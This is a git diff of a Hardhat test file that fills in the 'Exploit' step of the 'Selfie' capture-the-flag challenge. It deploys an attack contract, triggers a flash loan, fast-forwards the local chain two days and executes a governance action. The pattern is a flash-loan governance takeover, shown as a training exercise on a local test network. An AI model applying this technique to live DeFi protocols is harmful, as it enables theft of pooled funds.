@@ -1,4 +1,4 @@
-const { ethers } = require('hardhat');
+const { ethers, network } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Selfie', function () {
@@ -30,7 +30,12 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackSelfieFactory = await ethers.getContractFactory('AttackSelfie', deployer);
+        const attackSelfie = await AttackSelfieFactory.deploy(attacker.address, this.pool.address, this.governance.address);
+        await attackSelfie.triggerFlashLoan(); // Start the attack
+        await network.provider.send("evm_increaseTime", [60 * 60 * 48]); // Increase time by 2 days
+        await network.provider.send("evm_mine");
+        await this.governance.executeAction(1);
     });
 
     after(async function () {
